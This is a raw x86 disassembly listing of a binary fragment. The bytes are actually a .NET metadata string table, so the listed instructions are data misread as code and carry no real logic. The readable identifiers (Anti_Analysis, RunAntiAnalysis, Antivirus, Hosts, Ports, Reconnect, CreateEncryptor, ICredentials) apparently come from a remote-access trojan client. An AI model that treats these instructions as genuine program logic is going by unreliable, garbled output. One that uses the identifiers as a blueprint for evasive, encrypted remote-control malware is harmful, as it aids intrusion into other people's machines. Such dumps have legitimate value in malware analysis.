  408c91:	74 72                	je     0x408d05
  408c93:	65 61                	gs popa
  408c95:	6d                   	insl   (%dx),%es:(%edi)
  408c96:	57                   	push   %edi
  408c97:	72 69                	jb     0x408d02
  408c99:	74 65                	je     0x408d00
  408c9b:	72 00                	jb     0x408c9d
  408c9d:	54                   	push   %esp
  408c9e:	65 78 74             	gs js  0x408d15
  408ca1:	57                   	push   %edi
  408ca2:	72 69                	jb     0x408d0d
  408ca4:	74 65                	je     0x408d0b
  408ca6:	72 00                	jb     0x408ca8
  408ca8:	45                   	inc    %ebp
  408ca9:	6e                   	outsb  %ds:(%esi),(%dx)
  408caa:	74 65                	je     0x408d11
  408cac:	72 00                	jb     0x408cae
  408cae:	42                   	inc    %edx
  408caf:	69 74 43 6f 6e 76 65 	imul   $0x7265766e,0x6f(%ebx,%eax,2),%esi
  408cb6:	72 
  408cb7:	74 65                	je     0x408d1e
  408cb9:	72 00                	jb     0x408cbb
  408cbb:	54                   	push   %esp
  408cbc:	6f                   	outsl  %ds:(%esi),(%dx)
  408cbd:	4c                   	dec    %esp
  408cbe:	6f                   	outsl  %ds:(%esi),(%dx)
  408cbf:	77 65                	ja     0x408d26
  408cc1:	72 00                	jb     0x408cc3
  408cc3:	45                   	inc    %ebp
  408cc4:	72 72                	jb     0x408d38
  408cc6:	6f                   	outsl  %ds:(%esi),(%dx)
  408cc7:	72 00                	jb     0x408cc9
  408cc9:	49                   	dec    %ecx
  408cca:	45                   	inc    %ebp
  408ccb:	6e                   	outsb  %ds:(%esi),(%dx)
  408ccc:	75 6d                	jne    0x408d3b
  408cce:	65 72 61             	gs jb  0x408d32
  408cd1:	74 6f                	je     0x408d42
  408cd3:	72 00                	jb     0x408cd5
  408cd5:	4d                   	dec    %ebp
  408cd6:	61                   	popa
  408cd7:	6e                   	outsb  %ds:(%esi),(%dx)
  408cd8:	61                   	popa
  408cd9:	67 65 6d             	gs insl (%dx),%es:(%di)
  408cdc:	65 6e                	outsb  %gs:(%esi),(%dx)
  408cde:	74 4f                	je     0x408d2f
  408ce0:	62 6a 65             	bound  %ebp,0x65(%edx)
  408ce3:	63 74 45 6e          	arpl   %esi,0x6e(%ebp,%eax,2)
  408ce7:	75 6d                	jne    0x408d56
  408ce9:	65 72 61             	gs jb  0x408d4d
  408cec:	74 6f                	je     0x408d5d
  408cee:	72 00                	jb     0x408cf0
  408cf0:	53                   	push   %ebx
  408cf1:	79 73                	jns    0x408d66
  408cf3:	74 65                	je     0x408d5a
  408cf5:	6d                   	insl   (%dx),%es:(%edi)
  408cf6:	2e 43                	cs inc %ebx
  408cf8:	6f                   	outsl  %ds:(%esi),(%dx)
  408cf9:	6c                   	insb   (%dx),%es:(%edi)
  408cfa:	6c                   	insb   (%dx),%es:(%edi)
  408cfb:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  408d00:	6e                   	outsb  %ds:(%esi),(%dx)
  408d01:	73 2e                	jae    0x408d31
  408d03:	49                   	dec    %ecx
  408d04:	45                   	inc    %ebp
  408d05:	6e                   	outsb  %ds:(%esi),(%dx)
  408d06:	75 6d                	jne    0x408d75
  408d08:	65 72 61             	gs jb  0x408d6c
  408d0b:	62 6c 65 2e          	bound  %ebp,0x2e(%ebp,%eiz,2)
  408d0f:	47                   	inc    %edi
  408d10:	65 74 45             	gs je  0x408d58
  408d13:	6e                   	outsb  %ds:(%esi),(%dx)
  408d14:	75 6d                	jne    0x408d83
  408d16:	65 72 61             	gs jb  0x408d7a
  408d19:	74 6f                	je     0x408d8a
  408d1b:	72 00                	jb     0x408d1d
  408d1d:	41                   	inc    %ecx
  408d1e:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  408d22:	61                   	popa
  408d23:	74 6f                	je     0x408d94
  408d25:	72 00                	jb     0x408d27
  408d27:	2e 63 74 6f 72       	arpl   %esi,%cs:0x72(%edi,%ebp,2)
  408d2c:	00 2e                	add    %ch,(%esi)
  408d2e:	63 63 74             	arpl   %esp,0x74(%ebx)
  408d31:	6f                   	outsl  %ds:(%esi),(%dx)
  408d32:	72 00                	jb     0x408d34
  408d34:	4d                   	dec    %ebp
  408d35:	6f                   	outsl  %ds:(%esi),(%dx)
  408d36:	6e                   	outsb  %ds:(%esi),(%dx)
  408d37:	69 74 6f 72 00 43 72 	imul   $0x65724300,0x72(%edi,%ebp,2),%esi
  408d3e:	65 
  408d3f:	61                   	popa
  408d40:	74 65                	je     0x408da7
  408d42:	44                   	inc    %esp
  408d43:	65 63 72 79          	arpl   %esi,%gs:0x79(%edx)
  408d47:	70 74                	jo     0x408dbd
  408d49:	6f                   	outsl  %ds:(%esi),(%dx)
  408d4a:	72 00                	jb     0x408d4c
  408d4c:	43                   	inc    %ebx
  408d4d:	72 65                	jb     0x408db4
  408d4f:	61                   	popa
  408d50:	74 65                	je     0x408db7
  408d52:	45                   	inc    %ebp
  408d53:	6e                   	outsb  %ds:(%esi),(%dx)
  408d54:	63 72 79             	arpl   %esi,0x79(%edx)
  408d57:	70 74                	jo     0x408dcd
  408d59:	6f                   	outsl  %ds:(%esi),(%dx)
  408d5a:	72 00                	jb     0x408d5c
  408d5c:	49                   	dec    %ecx
  408d5d:	6e                   	outsb  %ds:(%esi),(%dx)
  408d5e:	74 50                	je     0x408db0
  408d60:	74 72                	je     0x408dd4
  408d62:	00 53 79             	add    %dl,0x79(%ebx)
  408d65:	73 74                	jae    0x408ddb
  408d67:	65 6d                	gs insl (%dx),%es:(%edi)
  408d69:	2e 44                	cs inc %esp
  408d6b:	69 61 67 6e 6f 73 74 	imul   $0x74736f6e,0x67(%ecx),%esp
  408d72:	69 63 73 00 4e 61 74 	imul   $0x74614e00,0x73(%ebx),%esp
  408d79:	69 76 65 4d 65 74 68 	imul   $0x6874654d,0x65(%esi),%esi
  408d80:	6f                   	outsl  %ds:(%esi),(%dx)
  408d81:	64 73 00             	fs jae 0x408d84
  408d84:	4d                   	dec    %ebp
  408d85:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  408d8c:	74 2e                	je     0x408dbc
  408d8e:	56                   	push   %esi
  408d8f:	69 73 75 61 6c 42 61 	imul   $0x61426c61,0x75(%ebx),%esi
  408d96:	73 69                	jae    0x408e01
  408d98:	63 2e                	arpl   %ebp,(%esi)
  408d9a:	44                   	inc    %esp
  408d9b:	65 76 69             	gs jbe 0x408e07
  408d9e:	63 65 73             	arpl   %esp,0x73(%ebp)
  408da1:	00 53 79             	add    %dl,0x79(%ebx)
  408da4:	73 74                	jae    0x408e1a
  408da6:	65 6d                	gs insl (%dx),%es:(%edi)
  408da8:	2e 52                	cs push %edx
  408daa:	75 6e                	jne    0x408e1a
  408dac:	74 69                	je     0x408e17
  408dae:	6d                   	insl   (%dx),%es:(%edi)
  408daf:	65 2e 49             	gs cs dec %ecx
  408db2:	6e                   	outsb  %ds:(%esi),(%dx)
  408db3:	74 65                	je     0x408e1a
  408db5:	72 6f                	jb     0x408e26
  408db7:	70 53                	jo     0x408e0c
  408db9:	65 72 76             	gs jb  0x408e32
  408dbc:	69 63 65 73 00 53 79 	imul   $0x79530073,0x65(%ebx),%esp
  408dc3:	73 74                	jae    0x408e39
  408dc5:	65 6d                	gs insl (%dx),%es:(%edi)
  408dc7:	2e 52                	cs push %edx
  408dc9:	75 6e                	jne    0x408e39
  408dcb:	74 69                	je     0x408e36
  408dcd:	6d                   	insl   (%dx),%es:(%edi)
  408dce:	65 2e 43             	gs cs inc %ebx
  408dd1:	6f                   	outsl  %ds:(%esi),(%dx)
  408dd2:	6d                   	insl   (%dx),%es:(%edi)
  408dd3:	70 69                	jo     0x408e3e
  408dd5:	6c                   	insb   (%dx),%es:(%edi)
  408dd6:	65 72 53             	gs jb  0x408e2c
  408dd9:	65 72 76             	gs jb  0x408e52
  408ddc:	69 63 65 73 00 44 65 	imul   $0x65440073,0x65(%ebx),%esp
  408de3:	62 75 67             	bound  %esi,0x67(%ebp)
  408de6:	67 69 6e 67 4d 6f 64 	imul   $0x65646f4d,0x67(%bp),%ebp
  408ded:	65 
  408dee:	73 00                	jae    0x408df0
  408df0:	45                   	inc    %ebp
  408df1:	78 70                	js     0x408e63
  408df3:	61                   	popa
  408df4:	6e                   	outsb  %ds:(%esi),(%dx)
  408df5:	64 45                	fs inc %ebp
  408df7:	6e                   	outsb  %ds:(%esi),(%dx)
  408df8:	76 69                	jbe    0x408e63
  408dfa:	72 6f                	jb     0x408e6b
  408dfc:	6e                   	outsb  %ds:(%esi),(%dx)
  408dfd:	6d                   	insl   (%dx),%es:(%edi)
  408dfe:	65 6e                	outsb  %gs:(%esi),(%dx)
  408e00:	74 56                	je     0x408e58
  408e02:	61                   	popa
  408e03:	72 69                	jb     0x408e6e
  408e05:	61                   	popa
  408e06:	62 6c 65 73          	bound  %ebp,0x73(%ebp,%eiz,2)
  408e0a:	00 47 65             	add    %al,0x65(%edi)
  408e0d:	74 50                	je     0x408e5f
  408e0f:	72 6f                	jb     0x408e80
  408e11:	63 65 73             	arpl   %esp,0x73(%ebp)
  408e14:	73 65                	jae    0x408e7b
  408e16:	73 00                	jae    0x408e18
  408e18:	47                   	inc    %edi
  408e19:	65 74 48             	gs je  0x408e64
  408e1c:	6f                   	outsl  %ds:(%esi),(%dx)
  408e1d:	73 74                	jae    0x408e93
  408e1f:	41                   	inc    %ecx
  408e20:	64 64 72 65          	fs fs jb 0x408e89
  408e24:	73 73                	jae    0x408e99
  408e26:	65 73 00             	gs jae 0x408e29
  408e29:	53                   	push   %ebx
  408e2a:	79 73                	jns    0x408e9f
  408e2c:	74 65                	je     0x408e93
  408e2e:	6d                   	insl   (%dx),%es:(%edi)
  408e2f:	2e 53                	cs push %ebx
  408e31:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  408e35:	69 74 79 2e 43 72 79 	imul   $0x70797243,0x2e(%ecx,%edi,2),%esi
  408e3c:	70 
  408e3d:	74 6f                	je     0x408eae
  408e3f:	67 72 61             	addr16 jb 0x408ea3
  408e42:	70 68                	jo     0x408eac
  408e44:	79 2e                	jns    0x408e74
  408e46:	58                   	pop    %eax
  408e47:	35 30 39 43 65       	xor    $0x65433930,%eax
  408e4c:	72 74                	jb     0x408ec2
  408e4e:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  408e55:	73 00                	jae    0x408e57
  408e57:	45                   	inc    %ebp
  408e58:	6e                   	outsb  %ds:(%esi),(%dx)
  408e59:	63 6f 64             	arpl   %ebp,0x64(%edi)
  408e5c:	65 32 42 79          	xor    %gs:0x79(%edx),%al
  408e60:	74 65                	je     0x408ec7
  408e62:	73 00                	jae    0x408e64
  408e64:	47                   	inc    %edi
  408e65:	65 74 55             	gs je  0x408ebd
  408e68:	74 66                	je     0x408ed0
  408e6a:	38 42 79             	cmp    %al,0x79(%edx)
  408e6d:	74 65                	je     0x408ed4
  408e6f:	73 00                	jae    0x408e71
  408e71:	75 74                	jne    0x408ee7
  408e73:	66 38 42 79          	data16 cmp %al,0x79(%edx)
  408e77:	74 65                	je     0x408ede
  408e79:	73 00                	jae    0x408e7b
  408e7b:	52                   	push   %edx
  408e7c:	66 63 32             	arpl   %si,(%edx)
  408e7f:	38 39                	cmp    %bh,(%ecx)
  408e81:	38 44 65 72          	cmp    %al,0x72(%ebp,%eiz,2)
  408e85:	69 76 65 42 79 74 65 	imul   $0x65747942,0x65(%esi),%esi
  408e8c:	73 00                	jae    0x408e8e
  408e8e:	52                   	push   %edx
  408e8f:	65 61                	gs popa
  408e91:	64 41                	fs inc %ecx
  408e93:	6c                   	insb   (%dx),%es:(%edi)
  408e94:	6c                   	insb   (%dx),%es:(%edi)
  408e95:	42                   	inc    %edx
  408e96:	79 74                	jns    0x408f0c
  408e98:	65 73 00             	gs jae 0x408e9b
  408e9b:	44                   	inc    %esp
  408e9c:	65 63 6f 64          	arpl   %ebp,%gs:0x64(%edi)
  408ea0:	65 46                	gs inc %esi
  408ea2:	72 6f                	jb     0x408f13
  408ea4:	6d                   	insl   (%dx),%es:(%edi)
  408ea5:	42                   	inc    %edx
  408ea6:	79 74                	jns    0x408f1c
  408ea8:	65 73 00             	gs jae 0x408eab
  408eab:	53                   	push   %ebx
  408eac:	77 61                	ja     0x408f0f
  408eae:	70 42                	jo     0x408ef2
  408eb0:	79 74                	jns    0x408f26
  408eb2:	65 73 00             	gs jae 0x408eb5
  408eb5:	4c                   	dec    %esp
  408eb6:	6f                   	outsl  %ds:(%esi),(%dx)
  408eb7:	61                   	popa
  408eb8:	64 46                	fs inc %esi
  408eba:	69 6c 65 41 73 42 79 	imul   $0x74794273,0x41(%ebp,%eiz,2),%ebp
  408ec1:	74 
  408ec2:	65 73 00             	gs jae 0x408ec5
  408ec5:	47                   	inc    %edi
  408ec6:	65 74 41             	gs je  0x408f0a
  408ec9:	73 42                	jae    0x408f0d
  408ecb:	79 74                	jns    0x408f41
  408ecd:	65 73 00             	gs jae 0x408ed0
  408ed0:	53                   	push   %ebx
  408ed1:	65 74 41             	gs je  0x408f15
  408ed4:	73 42                	jae    0x408f18
  408ed6:	79 74                	jns    0x408f4c
  408ed8:	65 73 00             	gs jae 0x408edb
  408edb:	47                   	inc    %edi
  408edc:	65 74 42             	gs je  0x408f21
  408edf:	79 74                	jns    0x408f55
  408ee1:	65 73 00             	gs jae 0x408ee4
  408ee4:	72 61                	jb     0x408f47
  408ee6:	77 42                	ja     0x408f2a
  408ee8:	79 74                	jns    0x408f5e
  408eea:	65 73 00             	gs jae 0x408eed
  408eed:	62 79 74             	bound  %edi,0x74(%ecx)
  408ef0:	65 73 00             	gs jae 0x408ef3
  408ef3:	43                   	inc    %ebx
  408ef4:	53                   	push   %ebx
  408ef5:	68 61 72 70 41       	push   $0x41707261
  408efa:	72 67                	jb     0x408f63
  408efc:	75 6d                	jne    0x408f6b
  408efe:	65 6e                	outsb  %gs:(%esi),(%dx)
  408f00:	74 49                	je     0x408f4b
  408f02:	6e                   	outsb  %ds:(%esi),(%dx)
  408f03:	66 6f                	outsw  %ds:(%esi),(%dx)
  408f05:	46                   	inc    %esi
  408f06:	6c                   	insb   (%dx),%es:(%edi)
  408f07:	61                   	popa
  408f08:	67 73 00             	addr16 jae 0x408f0b
  408f0b:	43                   	inc    %ebx
  408f0c:	53                   	push   %ebx
  408f0d:	68 61 72 70 42       	push   $0x42707261
  408f12:	69 6e 64 65 72 46 6c 	imul   $0x6c467265,0x64(%esi),%ebp
  408f19:	61                   	popa
  408f1a:	67 73 00             	addr16 jae 0x408f1d
  408f1d:	65 73 46             	gs jae 0x408f66
  408f20:	6c                   	insb   (%dx),%es:(%edi)
  408f21:	61                   	popa
  408f22:	67 73 00             	addr16 jae 0x408f25
  408f25:	53                   	push   %ebx
  408f26:	74 72                	je     0x408f9a
  408f28:	69 6e 67 73 00 49 6e 	imul   $0x6e490073,0x67(%esi),%ebp
  408f2f:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
  408f36:	65 
  408f37:	53                   	push   %ebx
  408f38:	65 74 74             	gs je  0x408faf
  408f3b:	69 6e 67 73 00 53 65 	imul   $0x65530073,0x67(%esi),%ebp
  408f42:	73 73                	jae    0x408fb7
  408f44:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  408f4b:	6e                   	outsb  %ds:(%esi),(%dx)
  408f4c:	67 45                	addr16 inc %ebp
  408f4e:	76 65                	jbe    0x408fb5
  408f50:	6e                   	outsb  %ds:(%esi),(%dx)
  408f51:	74 41                	je     0x408f94
  408f53:	72 67                	jb     0x408fbc
  408f55:	73 00                	jae    0x408f57
  408f57:	41                   	inc    %ecx
  408f58:	6e                   	outsb  %ds:(%esi),(%dx)
  408f59:	74 69                	je     0x408fc4
  408f5b:	5f                   	pop    %edi
  408f5c:	41                   	inc    %ecx
  408f5d:	6e                   	outsb  %ds:(%esi),(%dx)
  408f5e:	61                   	popa
  408f5f:	6c                   	insb   (%dx),%es:(%edi)
  408f60:	79 73                	jns    0x408fd5
  408f62:	69 73 00 52 75 6e 41 	imul   $0x416e7552,0x0(%ebx),%esi
  408f69:	6e                   	outsb  %ds:(%esi),(%dx)
  408f6a:	74 69                	je     0x408fd5
  408f6c:	41                   	inc    %ecx
  408f6d:	6e                   	outsb  %ds:(%esi),(%dx)
  408f6e:	61                   	popa
  408f6f:	6c                   	insb   (%dx),%es:(%edi)
  408f70:	79 73                	jns    0x408fe5
  408f72:	69 73 00 50 61 63 6b 	imul   $0x6b636150,0x0(%ebx),%esi
  408f79:	73 00                	jae    0x408f7b
  408f7b:	49                   	dec    %ecx
  408f7c:	43                   	inc    %ebx
  408f7d:	72 65                	jb     0x408fe4
  408f7f:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  408f82:	74 69                	je     0x408fed
  408f84:	61                   	popa
  408f85:	6c                   	insb   (%dx),%es:(%edi)
  408f86:	73 00                	jae    0x408f88
  408f88:	73 65                	jae    0x408fef
  408f8a:	74 5f                	je     0x408feb
  408f8c:	43                   	inc    %ebx
  408f8d:	72 65                	jb     0x408ff4
  408f8f:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  408f92:	74 69                	je     0x408ffd
  408f94:	61                   	popa
  408f95:	6c                   	insb   (%dx),%es:(%edi)
  408f96:	73 00                	jae    0x408f98
  408f98:	45                   	inc    %ebp
  408f99:	71 75                	jno    0x409010
  408f9b:	61                   	popa
  408f9c:	6c                   	insb   (%dx),%es:(%edi)
  408f9d:	73 00                	jae    0x408f9f
  408f9f:	53                   	push   %ebx
  408fa0:	73 6c                	jae    0x40900e
  408fa2:	50                   	push   %eax
  408fa3:	72 6f                	jb     0x409014
  408fa5:	74 6f                	je     0x409016
  408fa7:	63 6f 6c             	arpl   %ebp,0x6c(%edi)
  408faa:	73 00                	jae    0x408fac
  408fac:	52                   	push   %edx
  408fad:	65 61                	gs popa
  408faf:	64 54                	fs push %esp
  408fb1:	6f                   	outsl  %ds:(%esi),(%dx)
  408fb2:	6f                   	outsl  %ds:(%esi),(%dx)
  408fb3:	6c                   	insb   (%dx),%es:(%edi)
  408fb4:	73 00                	jae    0x408fb6
  408fb6:	57                   	push   %edi
  408fb7:	72 69                	jb     0x409022
  408fb9:	74 65                	je     0x409020
  408fbb:	54                   	push   %esp
  408fbc:	6f                   	outsl  %ds:(%esi),(%dx)
  408fbd:	6f                   	outsl  %ds:(%esi),(%dx)
  408fbe:	6c                   	insb   (%dx),%es:(%edi)
  408fbf:	73 00                	jae    0x408fc1
  408fc1:	42                   	inc    %edx
  408fc2:	79 74                	jns    0x409038
  408fc4:	65 73 54             	gs jae 0x40901b
  408fc7:	6f                   	outsl  %ds:(%esi),(%dx)
  408fc8:	6f                   	outsl  %ds:(%esi),(%dx)
  408fc9:	6c                   	insb   (%dx),%es:(%edi)
  408fca:	73 00                	jae    0x408fcc
  408fcc:	53                   	push   %ebx
  408fcd:	79 73                	jns    0x409042
  408fcf:	74 65                	je     0x409036
  408fd1:	6d                   	insl   (%dx),%es:(%edi)
  408fd2:	2e 57                	cs push %edi
  408fd4:	69 6e 64 6f 77 73 2e 	imul   $0x2e73776f,0x64(%esi),%ebp
  408fdb:	46                   	inc    %esi
  408fdc:	6f                   	outsl  %ds:(%esi),(%dx)
  408fdd:	72 6d                	jb     0x40904c
  408fdf:	73 00                	jae    0x408fe1
  408fe1:	44                   	inc    %esp
  408fe2:	6e                   	outsb  %ds:(%esi),(%dx)
  408fe3:	73 00                	jae    0x408fe5
  408fe5:	43                   	inc    %ebx
  408fe6:	6f                   	outsl  %ds:(%esi),(%dx)
  408fe7:	6e                   	outsb  %ds:(%esi),(%dx)
  408fe8:	74 61                	je     0x40904b
  408fea:	69 6e 73 00 53 79 73 	imul   $0x73795300,0x73(%esi),%ebp
  408ff1:	74 65                	je     0x409058
  408ff3:	6d                   	insl   (%dx),%es:(%edi)
  408ff4:	2e 43                	cs inc %ebx
  408ff6:	6f                   	outsl  %ds:(%esi),(%dx)
  408ff7:	6c                   	insb   (%dx),%es:(%edi)
  408ff8:	6c                   	insb   (%dx),%es:(%edi)
  408ff9:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  408ffe:	6e                   	outsb  %ds:(%esi),(%dx)
  408fff:	73 00                	jae    0x409001
  409001:	53                   	push   %ebx
  409002:	74 72                	je     0x409076
  409004:	69 6e 67 53 70 6c 69 	imul   $0x696c7053,0x67(%esi),%ebp
  40900b:	74 4f                	je     0x40905c
  40900d:	70 74                	jo     0x409083
  40900f:	69 6f 6e 73 00 47 65 	imul   $0x65470073,0x6e(%edi),%ebp
  409016:	74 49                	je     0x409061
  409018:	6d                   	insl   (%dx),%es:(%edi)
  409019:	61                   	popa
  40901a:	67 65 44             	addr16 gs inc %esp
  40901d:	65 63 6f 64          	arpl   %ebp,%gs:0x64(%edi)
  409021:	65 72 73             	gs jb  0x409097
  409024:	00 52 75             	add    %dl,0x75(%edx)
  409027:	6e                   	outsb  %ds:(%esi),(%dx)
  409028:	74 69                	je     0x409093
  40902a:	6d                   	insl   (%dx),%es:(%edi)
  40902b:	65 48                	gs dec %eax
  40902d:	65 6c                	gs insb (%dx),%es:(%edi)
  40902f:	70 65                	jo     0x409096
  409031:	72 73                	jb     0x4090a6
  409033:	00 53 73             	add    %dl,0x73(%ebx)
  409036:	6c                   	insb   (%dx),%es:(%edi)
  409037:	50                   	push   %eax
  409038:	6f                   	outsl  %ds:(%esi),(%dx)
  409039:	6c                   	insb   (%dx),%es:(%edi)
  40903a:	69 63 79 45 72 72 6f 	imul   $0x6f727245,0x79(%ebx),%esp
  409041:	72 73                	jb     0x4090b6
  409043:	00 73 73             	add    %dh,0x73(%ebx)
  409046:	6c                   	insb   (%dx),%es:(%edi)
  409047:	50                   	push   %eax
  409048:	6f                   	outsl  %ds:(%esi),(%dx)
  409049:	6c                   	insb   (%dx),%es:(%edi)
  40904a:	69 63 79 45 72 72 6f 	imul   $0x6f727245,0x79(%ebx),%esp
  409051:	72 73                	jb     0x4090c6
  409053:	00 46 69             	add    %al,0x69(%esi)
  409056:	6c                   	insb   (%dx),%es:(%edi)
  409057:	65 41                	gs inc %ecx
  409059:	63 63 65             	arpl   %esp,0x65(%ebx)
  40905c:	73 73                	jae    0x4090d1
  40905e:	00 68 50             	add    %ch,0x50(%eax)
  409061:	72 6f                	jb     0x4090d2
  409063:	63 65 73             	arpl   %esp,0x73(%ebp)
  409066:	73 00                	jae    0x409068
  409068:	47                   	inc    %edi
  409069:	65 74 43             	gs je  0x4090af
  40906c:	75 72                	jne    0x4090e0
  40906e:	72 65                	jb     0x4090d5
  409070:	6e                   	outsb  %ds:(%esi),(%dx)
  409071:	74 50                	je     0x4090c3
  409073:	72 6f                	jb     0x4090e4
  409075:	63 65 73             	arpl   %esp,0x73(%ebp)
  409078:	73 00                	jae    0x40907a
  40907a:	49                   	dec    %ecx
  40907b:	50                   	push   %eax
  40907c:	41                   	inc    %ecx
  40907d:	64 64 72 65          	fs fs jb 0x4090e6
  409081:	73 73                	jae    0x4090f6
  409083:	00 43 6f             	add    %al,0x6f(%ebx)
  409086:	6d                   	insl   (%dx),%es:(%edi)
  409087:	70 72                	jo     0x4090fb
  409089:	65 73 73             	gs jae 0x4090ff
  40908c:	00 44 65 63          	add    %al,0x63(%ebp,%eiz,2)
  409090:	6f                   	outsl  %ds:(%esi),(%dx)
  409091:	6d                   	insl   (%dx),%es:(%edi)
  409092:	70 72                	jo     0x409106
  409094:	65 73 73             	gs jae 0x40910a
  409097:	00 53 79             	add    %dl,0x79(%ebx)
  40909a:	73 74                	jae    0x409110
  40909c:	65 6d                	gs insl (%dx),%es:(%edi)
  40909e:	2e 4e                	cs dec %esi
  4090a0:	65 74 2e             	gs je  0x4090d1
  4090a3:	53                   	push   %ebx
  4090a4:	6f                   	outsl  %ds:(%esi),(%dx)
  4090a5:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  4090a8:	74 73                	je     0x40911d
  4090aa:	00 73 65             	add    %dh,0x65(%ebx)
  4090ad:	74 5f                	je     0x40910e
  4090af:	41                   	inc    %ecx
  4090b0:	72 67                	jb     0x409119
  4090b2:	75 6d                	jne    0x409121
  4090b4:	65 6e                	outsb  %gs:(%esi),(%dx)
  4090b6:	74 73                	je     0x40912b
  4090b8:	00 53 79             	add    %dl,0x79(%ebx)
  4090bb:	73 74                	jae    0x409131
  4090bd:	65 6d                	gs insl (%dx),%es:(%edi)
  4090bf:	45                   	inc    %ebp
  4090c0:	76 65                	jbe    0x409127
  4090c2:	6e                   	outsb  %ds:(%esi),(%dx)
  4090c3:	74 73                	je     0x409138
  4090c5:	00 50 6f             	add    %dl,0x6f(%eax)
  4090c8:	72 74                	jb     0x40913e
  4090ca:	73 00                	jae    0x4090cc
  4090cc:	45                   	inc    %ebp
  4090cd:	78 69                	js     0x409138
  4090cf:	73 74                	jae    0x409145
  4090d1:	73 00                	jae    0x4090d3
  4090d3:	48                   	dec    %eax
  4090d4:	6f                   	outsl  %ds:(%esi),(%dx)
  4090d5:	73 74                	jae    0x40914b
  4090d7:	73 00                	jae    0x4090d9
  4090d9:	41                   	inc    %ecx
  4090da:	6e                   	outsb  %ds:(%esi),(%dx)
  4090db:	74 69                	je     0x409146
  4090dd:	76 69                	jbe    0x409148
  4090df:	72 75                	jb     0x409156
  4090e1:	73 00                	jae    0x4090e3
  4090e3:	43                   	inc    %ebx
  4090e4:	6f                   	outsl  %ds:(%esi),(%dx)
  4090e5:	6e                   	outsb  %ds:(%esi),(%dx)
  4090e6:	63 61 74             	arpl   %esp,0x74(%ecx)
  4090e9:	00 49 6d             	add    %cl,0x6d(%ecx)
  4090ec:	61                   	popa
  4090ed:	67 65 46             	addr16 gs inc %esi
  4090f0:	6f                   	outsl  %ds:(%esi),(%dx)
  4090f1:	72 6d                	jb     0x409160
  4090f3:	61                   	popa
  4090f4:	74 00                	je     0x4090f6
  4090f6:	66 6f                	outsw  %ds:(%esi),(%dx)
  4090f8:	72 6d                	jb     0x409167
  4090fa:	61                   	popa
  4090fb:	74 00                	je     0x4090fd
  4090fd:	57                   	push   %edi
  4090fe:	72 69                	jb     0x409169
  409100:	74 65                	je     0x409167
  409102:	46                   	inc    %esi
  409103:	6c                   	insb   (%dx),%es:(%edi)
  409104:	6f                   	outsl  %ds:(%esi),(%dx)
  409105:	61                   	popa
  409106:	74 00                	je     0x409108
  409108:	67 65 74 5f          	addr16 gs je 0x40916b
  40910c:	41                   	inc    %ecx
  40910d:	73 46                	jae    0x409155
  40910f:	6c                   	insb   (%dx),%es:(%edi)
  409110:	6f                   	outsl  %ds:(%esi),(%dx)
  409111:	61                   	popa
  409112:	74 00                	je     0x409114
  409114:	73 65                	jae    0x40917b
  409116:	74 5f                	je     0x409177
  409118:	41                   	inc    %ecx
  409119:	73 46                	jae    0x409161
  40911b:	6c                   	insb   (%dx),%es:(%edi)
  40911c:	6f                   	outsl  %ds:(%esi),(%dx)
  40911d:	61                   	popa
  40911e:	74 00                	je     0x409120
  409120:	47                   	inc    %edi
  409121:	65 74 41             	gs je  0x409165
  409124:	73 46                	jae    0x40916c
  409126:	6c                   	insb   (%dx),%es:(%edi)
  409127:	6f                   	outsl  %ds:(%esi),(%dx)
  409128:	61                   	popa
  409129:	74 00                	je     0x40912b
  40912b:	53                   	push   %ebx
  40912c:	65 74 41             	gs je  0x409170
  40912f:	73 46                	jae    0x409177
  409131:	6c                   	insb   (%dx),%es:(%edi)
  409132:	6f                   	outsl  %ds:(%esi),(%dx)
  409133:	61                   	popa
  409134:	74 00                	je     0x409136
  409136:	46                   	inc    %esi
  409137:	69 6e 64 4f 62 6a 65 	imul   $0x656a624f,0x64(%esi),%ebp
  40913e:	63 74 00 4d          	arpl   %esi,0x4d(%eax,%eax,1)
  409142:	61                   	popa
  409143:	6e                   	outsb  %ds:(%esi),(%dx)
  409144:	61                   	popa
  409145:	67 65 6d             	gs insl (%dx),%es:(%di)
  409148:	65 6e                	outsb  %gs:(%esi),(%dx)
  40914a:	74 42                	je     0x40918e
  40914c:	61                   	popa
  40914d:	73 65                	jae    0x4091b4
  40914f:	4f                   	dec    %edi
  409150:	62 6a 65             	bound  %ebp,0x65(%edx)
  409153:	63 74 00 46          	arpl   %esi,0x46(%eax,%eax,1)
  409157:	6f                   	outsl  %ds:(%esi),(%dx)
  409158:	72 63                	jb     0x4091bd
  40915a:	65 50                	gs push %eax
  40915c:	61                   	popa
  40915d:	74 68                	je     0x4091c7
  40915f:	4f                   	dec    %edi
  409160:	62 6a 65             	bound  %ebp,0x65(%edx)
  409163:	63 74 00 43          	arpl   %esi,0x43(%eax,%eax,1)
  409167:	6f                   	outsl  %ds:(%esi),(%dx)
  409168:	6c                   	insb   (%dx),%es:(%edi)
  409169:	6c                   	insb   (%dx),%es:(%edi)
  40916a:	65 63 74 00 43       	arpl   %esi,%gs:0x43(%eax,%eax,1)
  40916f:	6f                   	outsl  %ds:(%esi),(%dx)
  409170:	6e                   	outsb  %ds:(%esi),(%dx)
  409171:	6e                   	outsb  %ds:(%esi),(%dx)
  409172:	65 63 74 00 52       	arpl   %esi,%gs:0x52(%eax,%eax,1)
  409177:	65 63 6f 6e          	arpl   %ebp,%gs:0x6e(%edi)
  40917b:	6e                   	outsb  %ds:(%esi),(%dx)
  40917c:	65 63 74 00 47       	arpl   %esi,%gs:0x47(%eax,%eax,1)
  409181:	65 74 00             	gs je  0x409184
  409184:	53                   	push   %ebx
  409185:	79 73                	jns    0x4091fa
  409187:	74 65                	je     0x4091ee
  409189:	6d                   	insl   (%dx),%es:(%edi)
  40918a:	2e 4e                	cs dec %esi
  40918c:	65 74 00             	gs je  0x40918f
